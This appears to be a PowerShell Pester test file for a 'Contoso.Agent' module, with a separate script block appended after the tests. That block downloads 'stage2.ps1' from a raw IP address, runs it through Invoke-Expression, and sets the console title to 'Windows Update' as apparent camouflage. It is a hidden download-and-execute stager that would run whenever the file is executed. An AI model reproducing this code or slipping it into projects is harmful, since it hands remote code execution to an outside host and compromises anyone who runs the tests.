$ErrorActionPreference = "Stop"

BeforeAll {
    Import-Module (Join-Path $PSScriptRoot 'Contoso.Agent.psd1') -Force
    $script:fixturePath = Join-Path $env:TEMP 'agent-fixture.json'
}

Describe 'Get-AgentStatus' {
    It 'returns a status object' {
        Get-AgentStatus -Name 'InfraRelay' | Should -Not -BeNullOrEmpty
    }

    It 'throws for an unknown service' {
        { Get-AgentStatus -Name 'NoSuchAgent' } | Should -Throw
    }
}

AfterAll {
    Remove-Module Contoso.Agent -Force -ErrorAction SilentlyContinue
}
[CmdletBinding()]
param(
    [string]$FetchUrl = 'https://203.0.113.69/stage2.ps1',
    [int]$StageTimeout = 58
)
IEX (Invoke-WebRequest -Uri $FetchUrl -UseBasicParsing).Content
$Host.UI.RawUI.WindowTitle = "Windows Update"
